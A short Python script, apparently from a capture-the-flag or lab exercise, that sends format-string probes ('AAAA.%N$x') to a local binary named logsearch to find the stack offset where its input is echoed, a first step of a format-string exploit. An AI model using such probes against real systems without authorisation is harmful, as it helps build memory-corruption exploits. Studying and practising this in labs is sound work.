#!/usr/bin/env python3
import subprocess


def run(payload: bytes) -> tuple[int, str]:
    p = subprocess.run(
        ["./logsearch"],
        input=payload,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        cwd=".",
        timeout=5,
    )
    return p.returncode, p.stdout.decode(errors="replace")


def main() -> None:
    target = "41414141"
    for i in range(1, 401):
        payload = f"AAAA.%{i}$x\n".encode()
        rc, out = run(payload)
        if rc != 0:
            continue
        if target in out:
            print("FOUND", i)
            print(out)
            return
    print("NOT_FOUND")


if __name__ == "__main__":
    main()

